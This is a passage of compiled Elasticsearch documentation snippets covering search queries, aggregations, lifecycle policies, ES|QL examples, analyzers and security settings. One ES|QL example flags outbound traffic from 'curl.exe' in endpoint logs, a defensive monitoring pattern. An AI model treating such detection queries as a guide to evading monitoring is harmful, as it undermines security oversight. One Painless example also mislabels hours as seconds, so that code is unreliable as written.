https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_16\n\nLANGUAGE: json\nCODE:\n```\nPOST _connector/_sync_job\n{\n    \"id\": \"my-connector-id\",\n    \"job_type\": \"full\"\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Date Range Query Example\nDESCRIPTION: This example demonstrates a range query using date math in Elasticsearch. It returns documents where the 'timestamp' field contains a date between today and yesterday.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-range-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"range\": {\n      \"timestamp\": {\n        \"gte\": \"now-1d/d\",\n        \"lte\": \"now/d\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Including MV_SLICE Function Examples in Markdown\nDESCRIPTION: This snippet includes the markdown file containing usage examples for the MV_SLICE function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/mv_slice.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/mv_slice.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Executing geotile_grid aggregation in Elasticsearch\nDESCRIPTION: This Elasticsearch snippet demonstrates the use of geotile_grid aggregation, grouping documents by geotile values. The GET request specifies the location field and precision level. The response includes document counts per geotile bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_3\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"size\" : 0,\n  \"aggs\" : {\n     \"grouped\" : {\n        \"geotile_grid\" : {\n           \"field\" : \"location\",\n           \"precision\" : 6\n        }\n     }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 1,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 3,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : null,\n    \"hits\" : [ ]\n  },\n  \"aggregations\" : {\n    \"grouped\" : {\n      \"buckets\" : [\n        {\n          \"key\" : \"6/32/21\",\n          \"doc_count\" : 2\n        },\n        {\n          \"key\" : \"6/32/22\",\n          \"doc_count\" : 1\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mixing Different Value Sources in Elasticsearch Aggregation\nDESCRIPTION: Demonstrates combining date_histogram and terms aggregations in a composite aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing COUNT Function in ESQL\nDESCRIPTION: This SQL snippet demonstrates various test cases for the COUNT function in ESQL. It includes scenarios with different data types, NULL values, and empty sets to ensure proper functionality of the COUNT aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/count.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT COUNT(*);\n\nSELECT COUNT(*) FROM (VALUES (1), (2), (3));\n\nSELECT COUNT(1) FROM (VALUES (1), (2), (3));\n\nSELECT COUNT(NULL) FROM (VALUES (1), (2), (3));\n\nSELECT COUNT(a) FROM (VALUES (1), (2), (3)) AS t(a);\n\nSELECT COUNT(a) FROM (VALUES (1), (NULL), (3)) AS t(a);\n\nSELECT COUNT(a) FROM (VALUES (NULL), (NULL), (NULL)) AS t(a);\n\nSELECT COUNT(*);\n\nSELECT COUNT(1);\n```\n\n----------------------------------------\n\nTITLE: Array Format Geo Sort in Elasticsearch\nDESCRIPTION: Shows geo-distance sorting using array format [lon, lat] for location specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"sort\": [\n    {\n      \"_geo_distance\": {\n        \"pin.location\": [ -70, 40 ],\n        \"order\": \"asc\",\n        \"unit\": \"km\"\n      }\n    }\n  ],\n  \"query\": {\n    \"term\": { \"user\": \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Search Query with RRF Reranking\nDESCRIPTION: Advanced example showing how to combine query rules with reciprocal rank fusion (RRF) reranking to apply rules on reranked results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/searching-with-query-rules.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"retriever\": {\n    \"rule\": {\n      \"match_criteria\": {\n        \"query_string\": \"puggles\",\n        \"user_country\": \"us\"\n      },\n      \"ruleset_ids\": [\n        \"my-ruleset\"\n      ],\n      \"retriever\": {\n        \"rrf\": {\n          \"retrievers\": [\n            {\n              \"standard\": {\n                \"query\": {\n                  \"query_string\": {\n                    \"query\": \"pugs\"\n                  }\n                }\n              }\n            },\n            {\n              \"standard\": {\n                \"query\": {\n                  \"query_string\": {\n                    \"query\": \"puggles\"\n                  }\n                }\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch query boosting documents based on location\nDESCRIPTION: This snippet demonstrates a `bool` search that returns documents with the name `chocolate` and boosts documents with a `location` closer to `[-71.3, 41.15]` using the `distance_feature` query.  The `pivot` parameter defines the distance from the origin at which the relevance score is halved.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-distance-feature-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /items/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match\": {\n          \"name\": \"chocolate\"\n        }\n      },\n      \"should\": {\n        \"distance_feature\": {\n          \"field\": \"location\",\n          \"pivot\": \"1000m\",\n          \"origin\": [-71.3, 41.15]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Set Security User Processor in Elasticsearch Ingest Pipeline\nDESCRIPTION: This snippet demonstrates how to configure the Set Security User processor in an Elasticsearch ingest pipeline. It adds all user details for the current authenticated user to the 'user' field for all processed documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-node-set-security-user-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"processors\" : [\n    {\n      \"set_security_user\": {\n        \"field\": \"user\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Message Age with Elasticsearch Script Field in Console\nDESCRIPTION: This snippet demonstrates how to use Elasticsearch script fields to calculate the age of a message as the time elapsed from when the message was received to the current time. The computed age includes years, months, days, hours, minutes, and seconds. It uses the Painless scripting language and expects an Elasticsearch index with a datetime field. The 'now' parameter must be provided in milliseconds since epoch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_31\n\nLANGUAGE: console\nCODE:\n```\nGET /_search?pretty=true\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"message_age\": {\n      \"script\": {\n        \"source\": \"ZonedDateTime now = ZonedDateTime.ofInstant(Instant.ofEpochMilli(params[\\\"now\\\"]), ZoneId.of(\\\"Z\\\")); ZonedDateTime mdt = doc[\\\"datetime\\\"].value; String age; long years = mdt.until(now, ChronoUnit.YEARS); age = years + \\\"Y \\\"; mdt = mdt.plusYears(years); long months = mdt.until(now, ChronoUnit.MONTHS); age += months + \\\"M \\\"; mdt = mdt.plusMonths(months); long days = mdt.until(now, ChronoUnit.DAYS); age += days + \\\"D \\\"; mdt = mdt.plusDays(days); long hours = mdt.until(now, ChronoUnit.HOURS); age += hours + \\\"h \\\"; mdt = mdt.plusHours(hours); long minutes = mdt.until(now, ChronoUnit.MINUTES); age += minutes + \\\"m \\\"; mdt = mdt.plusMinutes(minutes); long seconds = mdt.until(now, ChronoUnit.SECONDS); age += hours + \\\"s\\\"; return age;\",\n        \"params\": {\n          \"now\": 1574005645830\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic JVM Option Configuration\nDESCRIPTION: Shows how to specify a JVM option for all Java versions using the -Xmx flag to set maximum heap size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/jvm-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n-Xmx2g\n```\n\n----------------------------------------\n\nTITLE: Configuring Index-Level Total Shards Per Node in Elasticsearch\nDESCRIPTION: Setting to limit the maximum number of shards (replicas and primaries) that will be allocated to a single node for a specific index. When not set, the value is unbounded.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/total-shards-per-node.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nindex.routing.allocation.total_shards_per_node\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Downsample Policy in Elasticsearch\nDESCRIPTION: Example of creating an ILM policy that includes a downsample action with hourly fixed intervals. The policy also includes a rollover action which is required when downsampling in the hot phase. The downsample action will aggregate time series data into hourly summaries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-downsample.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/datastream_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\": {\n            \"max_docs\": 1\n          },\n          \"downsample\": {\n  \t          \"fixed_interval\": \"1h\"\n  \t      }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match Query Example\nDESCRIPTION: This snippet demonstrates a basic multi_match query in Elasticsearch. It searches for the phrase \"this is a test\" across the \"subject\" and \"message\" fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":    \"this is a test\", <1>\n      \"fields\": [ \"subject\", \"message\" ] <2>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Predicate Token Filter in Elasticsearch Analyze API\nDESCRIPTION: This example demonstrates how to use the predicate_token_filter in an Elasticsearch analyze API request to filter tokens based on their length.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-predicatefilter-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [\n    {\n      \"type\": \"predicate_token_filter\",\n      \"script\": {\n        \"source\": \"\"\"\n          token.term.length() > 3\n        \"\"\"\n      }\n    }\n  ],\n  \"text\": \"the fox jumps the lazy dog\"\n}\n```\n\n----------------------------------------\n\nTITLE: Rollover Based on Index Age\nDESCRIPTION: ILM policy configuration that triggers rollover when the index is 7 days old.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_age\": \"7d\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Multi-match with Wildcard Fields\nDESCRIPTION: This snippet shows how to use wildcards in the fields array of a multi_match query. It searches for \"Will Smith\" in the \"title\", \"first_name\", and \"last_name\" fields (assuming *_name fields exist).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":    \"Will Smith\",\n      \"fields\": [ \"title\", \"*_name\" ] <1>\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rollover Based on Primary Shard Document Count\nDESCRIPTION: ILM policy configuration that triggers rollover when the largest primary shard contains 10 million documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"rollover\" : {\n            \"max_primary_shard_docs\": 10000000\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch GeoPoint with GeoShape\nDESCRIPTION: This code snippet shows how to query Elasticsearch `geo_point` fields using a `geo_shape` query with an inline shape definition. It uses the `envelope` GeoJSON extension to define a bounding box and searches for documents whose `geo_point` falls within that box using `intersects` relation. This demonstrates the compatibility of `geo_shape` queries with `geo_point` fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /example_points/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match_all\": {}\n      },\n      \"filter\": {\n        \"geo_shape\": {\n          \"location\": {\n            \"shape\": {\n              \"type\": \"envelope\",\n              \"coordinates\": [ [ 13.0, 53.0 ], [ 14.0, 52.0 ] ]\n            },\n            \"relation\": \"intersects\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Java Keystore Configuration Settings\nDESCRIPTION: Settings for configuring Java keystore (JKS) files containing private keys, certificates, and trust stores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_28\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.transport.ssl.keystore.path=/path/to/keystore.jks\nxpack.security.transport.ssl.keystore.password=keystorepass\nxpack.security.transport.ssl.keystore.secure_password=securepass\nxpack.security.transport.ssl.keystore.key_password=keypass\nxpack.security.transport.ssl.truststore.path=/path/to/truststore.jks\nxpack.security.transport.ssl.truststore.password=truststorepass\n```\n\n----------------------------------------\n\nTITLE: Applying Boost to match_all Query in Elasticsearch\nDESCRIPTION: This code snippet illustrates how to modify the default score of documents retrieved by a match_all query using the 'boost' parameter, allowing for customized scoring in Elasticsearch queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-all-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_all\": { \"boost\" : 1.2 }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Min Bucket Aggregation Syntax in Elasticsearch\nDESCRIPTION: Shows the basic structure of a min_bucket aggregation that finds the minimum value from specified buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-min-bucket-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"min_bucket\": {\n    \"buckets_path\": \"the_sum\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sorting Employee Data with ESQL\nDESCRIPTION: ESQL query that selects specific columns (first_name, last_name, height) from an employees table and sorts the results by height. The query demonstrates the use of KEEP for column selection and SORT for ordering results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/sort.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, height\n| SORT height\n```\n\n----------------------------------------\n\nTITLE: DISSECT Right Padding Example\nDESCRIPTION: Shows how to use the right padding modifier to handle variable spacing in log messages\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_4\n\nLANGUAGE: esql\nCODE:\n```\nROW message=\"1998-08-10T17:15:42          WARN\"\n| DISSECT message \"\"\"%{ts->} %{level}\"\"\"\n```\n\n----------------------------------------\n\nTITLE: Generating API Key for Gmail Connector\nDESCRIPTION: API call to create a security API key with appropriate permissions for the Gmail connector.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-gmail.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complex Elasticsearch Query Profile Example\nDESCRIPTION: Complex query example with term query, scoped aggregation, global aggregation, and post_filter showing how to structure advanced search requests.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"profile\": true,\n  \"query\": {\n    \"term\": {\n      \"user.id\": {\n        \"value\": \"elkbee\"\n      }\n    }\n  },\n  \"aggs\": {\n    \"my_scoped_agg\": {\n      \"terms\": {\n        \"field\": \"http.response.status_code\"\n      }\n    },\n    \"my_global_agg\": {\n      \"global\": {},\n      \"aggs\": {\n        \"my_level_agg\": {\n          \"terms\": {\n            \"field\": \"http.response.status_code\"\n          }\n        }\n      }\n    }\n  },\n  \"post_filter\": {\n    \"match\": {\n      \"message\": \"search\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with ASCII Folding Filter in Elasticsearch\nDESCRIPTION: Example of using the create index API to configure a new custom analyzer that incorporates the asciifolding filter. This creates an index with a standard_asciifolding analyzer that applies ASCII folding to tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-asciifolding-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT /asciifold_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_asciifolding\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"asciifolding\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Bucket Selector Aggregation in Elasticsearch Query\nDESCRIPTION: This example demonstrates how to use bucket selector aggregation in an Elasticsearch query. It filters sales data to retain only buckets where total monthly sales exceed 200.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-bucket-selector-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"total_sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"sales_bucket_filter\": {\n          \"bucket_selector\": {\n            \"buckets_path\": {\n              \"totalSales\": \"total_sales\"\n            },\n            \"script\": \"params.totalSales > 200\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Profile TLS/SSL Settings in Elasticsearch\nDESCRIPTION: Example of transport profile TLS/SSL settings in Elasticsearch. These settings apply to specific transport profiles and follow the pattern of transport.profiles.$PROFILE.xpack.security.* for customization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_49\n\nLANGUAGE: yaml\nCODE:\n```\ntransport.profiles.$PROFILE.xpack.security.ssl.key\n```\n\n----------------------------------------\n\nTITLE: Optimizing Scroll Search with _doc Sort in Elasticsearch\nDESCRIPTION: This snippet shows how to optimize a scroll search by sorting on _doc. This is the most efficient option when you want to iterate over all documents regardless of order.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nGET /_search?scroll=1m\n{\n  \"sort\": [\n    \"_doc\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering with LIKE Operator in ESQL\nDESCRIPTION: This code snippet demonstrates how to filter a dataset of employees using the LIKE operator in ESQL. The LIKE operator supports wildcards like '*' for zero or more characters and '?' for a single character. In this example, it filters for employees whose first name matches the pattern '?b*'. The snippet requires an ESQL environment with access to the 'employees' dataset and outputs the 'first_name' and 'last_name' fields for matching entries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/like.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE first_name LIKE \"\"\"?b*\"\"\"\n| KEEP first_name, last_name\n```\n\n----------------------------------------\n\nTITLE: Using Templated Fields for Timezone and Locale in Elasticsearch Date Processor\nDESCRIPTION: This example demonstrates how to use template snippets to dynamically extract timezone and locale values from document fields. The processor will use the values in 'my_timezone' and 'my_locale' fields when parsing dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"description\" : \"...\",\n  \"processors\" : [\n    {\n      \"date\" : {\n        \"field\" : \"initial_date\",\n        \"target_field\" : \"timestamp\",\n        \"formats\" : [\"ISO8601\"],\n        \"timezone\" : \"{{{my_timezone}}}\",\n        \"locale\" : \"{{{my_locale}}}\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: ES|QL LIKE Operator Case-Sensitive Example (Invalid)\nDESCRIPTION: This example demonstrates that the LIKE operator in ES|QL is case-sensitive and requires a full string match when used with text fields (which ES|QL treats as keyword fields). This query will not match the value \"Elasticsearch query language\" because of the case difference. The LIKE operator tries to match the whole string, which will also lead to the condition evaluating to false.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/limitations.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\n\n| WHERE field LIKE \"elasticsearch query language\"\n\n```\n\n----------------------------------------\n\nTITLE: Keyed Range Aggregation in Elasticsearch\nDESCRIPTION: Shows how to use the 'keyed' flag to return range buckets as a hash instead of an array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-range-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET sales/_search\n{\n  \"aggs\": {\n    \"price_ranges\": {\n      \"range\": {\n        \"field\": \"price\",\n        \"keyed\": true,\n        \"ranges\": [\n          { \"to\": 100 },\n          { \"from\": 100, \"to\": 200 },\n          { \"from\": 200 }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Index Alias for Rollover\nDESCRIPTION: Example showing how to configure an index with the required settings and alias for rollover functionality. Includes index lifecycle name and rollover alias settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-rollover.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"settings\": {\n    \"index.lifecycle.name\": \"my_policy\",\n    \"index.lifecycle.rollover_alias\": \"my_data\"\n  },\n  \"aliases\": {\n    \"my_data\": {\n      \"is_write_index\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: LIKE Pattern Matching in ESQL\nDESCRIPTION: Examples showing the usage of LIKE operator for pattern matching with wildcards (* and ?).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/where.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nWHERE field LIKE \"pattern\"\n```\n\n----------------------------------------\n\nTITLE: Querying with Linear Rank Feature Function in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the linear function in a rank_feature query. The query searches the 'test' index and applies the linear function to the 'pagerank' field to influence document scoring based on the field's value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-rank-feature-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /test/_search\n{\n  \"query\": {\n    \"rank_feature\": {\n      \"field\": \"pagerank\",\n      \"linear\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inefficient Suffix Wildcard Query for Percolator in Elasticsearch\nDESCRIPTION: An example of an inefficient suffix wildcard query pattern that should be avoided with the percolator. This query uses a direct wildcard expression which is more expensive to evaluate.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_11\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"query\": {\n    \"wildcard\": {\n      \"my_field\": \"*xyz\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using SUBSTRING, MV_SORT and VALUES in ESQL for Name Grouping\nDESCRIPTION: This ESQL query extracts the first letter from employee names, groups names by their first letter, sorts them within each group using MV_SORT with VALUES function, and finally sorts the results by the first letter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/values.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL first_letter = SUBSTRING(first_name, 0, 1)\n| STATS first_name = MV_SORT(VALUES(first_name)) BY first_letter\n| SORT first_letter\n```\n\n----------------------------------------\n\nTITLE: Using Null Safe Equality (<=>)  Operator in Elasticsearch SQL - Example 2\nDESCRIPTION: Shows another example of the null safe equality (<=>) operator, specifically comparing null with null, which returns true unlike standard equality operators.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nSELECT null <=> null AS \"equals\";\n\n    equals\n---------------\ntrue\n```\n\n----------------------------------------\n\nTITLE: Summing Outbound Traffic for curl.exe Process with ESQL\nDESCRIPTION: This query analyzes outbound traffic from the curl.exe process. It sums the bytes sent to each destination address, converts the sum to kilobytes, and returns the top 10 results sorted by traffic volume.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-examples.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM logs-endpoint\n| WHERE process.name == \"curl.exe\"\n| STATS bytes = SUM(destination.bytes) BY destination.address\n| EVAL kb =  bytes/1024\n| SORT kb DESC\n| LIMIT 10\n| KEEP kb,destination.address\n```\n\n----------------------------------------\n\nTITLE: Customizing Fingerprint Filter Configuration\nDESCRIPTION: Example of creating a custom fingerprint filter with modified separator and maximum output size parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-fingerprint-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT custom_fingerprint_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"fingerprint_plus_concat\" ]\n        }\n      },\n      \"filter\": {\n        \"fingerprint_plus_concat\": {\n          \"type\": \"fingerprint\",\n          \"max_output_size\": 100,\n          \"separator\": \"+\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Only Document IDs in Elasticsearch Search\nDESCRIPTION: Example of using an empty stored_fields array to return only the _id and _type metadata for each hit, without any field values, which minimizes response size.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"stored_fields\" : [],\n  \"query\" : {\n    \"term\" : { \"user\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Function Score to Boost Scores in Elasticsearch Query\nDESCRIPTION: This snippet demonstrates how to use the function_score query to boost the scores of documents returned by a match_all query. The parameters include a boost value, a random_score function, and a boost_mode operation for combining scores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"function_score\": {\n      \"query\": { \"match_all\": {} },\n      \"boost\": \"5\",\n      \"random_score\": {}, <1>\n      \"boost_mode\": \"multiply\"\n    }\n  